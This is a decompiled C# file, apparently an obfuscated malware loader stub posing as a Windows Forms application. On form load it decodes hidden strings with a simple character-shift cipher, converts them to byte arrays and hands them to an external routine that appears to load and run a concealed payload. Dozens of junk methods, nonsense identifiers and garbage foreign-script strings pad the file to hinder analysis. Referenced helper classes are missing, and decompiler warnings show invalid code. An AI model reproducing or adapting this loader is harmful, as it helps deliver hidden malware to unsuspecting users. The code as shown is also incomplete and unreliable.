using System;
using System.CodeDom;
using System.Collections;
using System.Collections.Generic;
using System.Deployment.Internal.CodeSigning;
using System.Deployment.Internal.Isolation;
using System.Deployment.Internal.Isolation.Manifest;
using System.Diagnostics;
using System.Globalization;
using System.IO.Compression;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Runtime.Remoting.Channels;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Security.Util;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.Internal;
using System.Windows.Forms.VisualStyles;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;

public class uq : Form
{
	public delegate object Owue9();

	public delegate byte[] fb6(string data);

	public delegate object lkjk9();

	public delegate object ty9(object S);

	public delegate OpCode Link9(string s);

	public delegate object yang1(object s);

	public static bool BND = false;

	public static byte[] byte_0;

	public static byte[] byte_1;

	public static byte[] B59;

	private string VQ;

	private static string Fktus = "1";

	public static string roPP = "0";

	public static int cID;

	internal static fb6 D = (fb6)kTTGsUqD();

	private object vQ;

	private object QrOaoWnZ;

	private object kyUWf;

	private object Mw;

	private object iS;

	private object cxLykMih;

	private object pL;

	private object YiGBefMgl;

	private object X;

	private object qGyiRTnQ;

	private object PaUmVrbms;

	private object DLz;

	private object WduVUkadV;

	private object lveeRRs;

	private object cWolJsDJ;

	private object TwNtzT;

	private object qugZgL;

	private object nCMuu;

	public uq()
	{
		((Form)this).add_Load((EventHandler)oUQQO);
		VQ = "xthD";
	}

	[STAThread]
	public static void nLrVlSYrz()
	{
		Application.Run((Form)(object)new uq());
	}

	private void oUQQO(object sender, EventArgs e)
	{
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		jKvLPSKiM();
		qaWLfV();
		Nxfh.Ojk();
		if (!BND)
		{
			try
			{
				Thread.Sleep(2000);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void TFxF()
	{
	}

	private static void jKvLPSKiM()
	{
		B59 = (byte[])RyQCGfURL(DNvviiK.kqm(Conversions.ToString(DNvviiK.H()), "2"));
		byte_0 = (byte[])RyQCGfURL(rxtGJXsu(Conversions.ToString(cjOoaq.ZXcOHOs()), Fktus));
	}

	private static void qaWLfV()
	{
		byte_1 = (byte[])RyQCGfURL(DNvviiK.kqm(Conversions.ToString(IRbW.utyj()), "sjxIqqd"));
		daxT(B59, new object[2] { byte_0, byte_1 }, "迪维吉わこすた", "吉吾尺克吾とけ");
	}

	public static void Ma()
	{
	}

	private static object kTTGsUqD()
	{
		return (fb6)RVjtPc.XcOHO();
	}

	public static object RyQCGfURL(string BiXr32艾吾艾吾贼)
	{
		return D(BiXr32艾吾艾吾贼);
	}

	public static object daxT(byte[] られめくやたせぃもおうやをこ, object[] elsJ3Ù尔艾À艾Ü艾德, string tGt4ÙÒ艾哦提西, string nvZ5迪艾艾尺尺Ù贝)
	{
		return RVjtPc.Kq(られめくやたせぃもおうやをこ, elsJ3Ù尔艾À艾Ü艾德);
	}

	public static string rxtGJXsu(string value, string pass)
	{
		DNvviiK.fb1 fb = (DNvviiK.fb1)DNvviiK.YdOHOsG();
		List<string> list = new List<string>();
		int i = 0;
		checked
		{
			for (int length = value.Length; i < length; i++)
			{
				char data = value[i];
				int num = fb(data);
				int num2 = num;
				list.Add(Conversions.ToString(Convert.ToChar(num2 - Conversions.ToInteger(E(pass)))));
			}
			return Strings.Join(list.ToArray(), "");
		}
	}

	private static object E(object o)
	{
		return o;
	}

	private static object OIlCUo(object s)
	{
		return s;
	}

	CustomAttributeNamedArgument H(FUNCFLAGS funcflags_0, SubcategoryMembershipEntryFieldId subcategoryMembershipEntryFieldId_0)
	{
		_ = uq.vQ;
		return (CustomAttributeNamedArgument)"にもうへふた";
	}

	CERT_POLICIES_INFO dDr(EnumApplicationPrivateFiles oiBxVqP)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		return (CERT_POLICIES_INFO)(this + oiBxVqP + uq.QrOaoWnZ);
	}

	__FixupData pk(PreProcessControlState NdvQjd)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		return (__FixupData)(this + NdvQjd + uq.kyUWf);
	}

	ushort pw(UNICODE_INTPTR_STRING unicode_INTPTR_STRING_0, VisualStyleState visualStyleState_0, Entry entry_0)
	{
		//IL_000b: Expected I4, but got O
		_ = uq.Mw;
		return (ushort)(int)"ひらよおくさうはる";
	}

	ServerProcessing BDXz(EXCEPINFO excepinfo_0, SECURITY_IMPERSONATION_LEVEL security_IMPERSONATION_LEVEL_0, MoveFileExFlags moveFileExFlags_0)
	{
		_ = uq.iS;
		return (ServerProcessing)"おつ";
	}

	ComMemberType Jq(long long_0, ValueFixupEnum valueFixupEnum_0, CompilationRelaxations compilationRelaxations_0, ExceptionMessageKind exceptionMessageKind_0, tagINVOKEKIND tagINVOKEKIND_0, ParseFlags parseFlags_0)
	{
		//IL_000b: Expected I4, but got O
		_ = uq.cxLykMih;
		return (ComMemberType)"けわぇねぇこえにて";
	}

	WIN32_FILE_ATTRIBUTE_DATA j(MOUSEINPUT mouseinput_0, DataSourceUpdateMode dataSourceUpdateMode_0, ScrollBarArrowButtonState scrollBarArrowButtonState_0, ToolStripManagerRenderMode toolStripManagerRenderMode_0, CALLCONV callconv_0)
	{
		_ = uq.pL;
		return (WIN32_FILE_ATTRIBUTE_DATA)"ふねもいたや";
	}

	HTTPAPI_VERSION t(MSG msg_0, bucket bucket_0, EndianessHeader endianessHeader_0)
	{
		_ = uq.YiGBefMgl;
		return (HTTPAPI_VERSION)"もたねの";
	}

	ContextForm cyG(ThreadPriority threadPriority_0, MBErrors mberrors_0, PatternGroup patternGroup_0, CspAlgorithmType cspAlgorithmType_0, ScrollBarState scrollBarState_0, CMS_REGISTRY_VALUE_HINT cms_REGISTRY_VALUE_HINT_0)
	{
		_ = uq.X;
		return (ContextForm)"せれかおとぬはつ";
	}

	IDOffsetItem VifOb(LinkBehavior BBck)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		return (IDOffsetItem)(this + BBck + uq.qGyiRTnQ);
	}

	LVFINDINFO ozRg(LinkState linkState_0, CustomAttributeRecord customAttributeRecord_0, FieldType fieldType_0, DataGridCell dataGridCell_0)
	{
		_ = uq.PaUmVrbms;
		return (LVFINDINFO)"らりをにちううふめ";
	}

	DataGridViewAutoSizeRowMode fbb(Disposition disposition_0, _CERT_CONTEXT _CERT_CONTEXT_0)
	{
		_ = uq.DLz;
		return (DataGridViewAutoSizeRowMode)"のほた";
	}

	ConfigEvents tXCz(IDLFLAG idlflag_0, OperandType operandType_0, VARDESC vardesc_0, WSAMsg wsamsg_0, ELEMDESC elemdesc_0)
	{
		_ = uq.WduVUkadV;
		return (ConfigEvents)"むにるみぬ";
	}

	IPMulticastRequest BOpK(UIOption uioption_0, ThreadPriorityLevel threadPriorityLevel_0, DeleteDirectoryOption deleteDirectoryOption_0, RegionFlags regionFlags_0, WINDOWPOS windowpos_0, DataGridViewMouseEvent dataGridViewMouseEvent_0)
	{
		_ = uq.lveeRRs;
		return (IPMulticastRequest)"りすほれほ";
	}

	ButtonID F(Disposition disposition_0, ControlKeyState controlKeyState_0, IDENTITY_ATTRIBUTE identity_ATTRIBUTE_0, DigitValues digitValues_0, ManifestResourceAttributes manifestResourceAttributes_0)
	{
		_ = uq.cWolJsDJ;
		return (ButtonID)"ちむめおかそよ";
	}

	TokenSource b(SIGDN sigdn_0, BindingMemberInfo bindingMemberInfo_0, CodeTypeReferenceOptions codeTypeReferenceOptions_0, StoreApplicationReference storeApplicationReference_0, GCLatencyMode gclatencyMode_0, KeyNumber keyNumber_0)
	{
		_ = uq.TwNtzT;
		return (TokenSource)"ちうれろ";
	}

	DigitValues lXnqt(CMSG_CTRL_VERIFY_SIGNATURE_EX_PARA cmsg_CTRL_VERIFY_SIGNATURE_EX_PARA_0, DataGridViewComboBoxDisplayStyle dataGridViewComboBoxDisplayStyle_0, DateTimePickerFormat dateTimePickerFormat_0)
	{
		_ = uq.qugZgL;
		return (DigitValues)"やさよつうぇゆくぇ";
	}

	KEY_USAGE_STRUCT hU(IpAddrString ipAddrString_0, MatchState matchState_0, AXL_SIGNER_INFO axl_SIGNER_INFO_0)
	{
		_ = uq.nCMuu;
		return (KEY_USAGE_STRUCT)"ぃつほろはれへむく";
	}
}
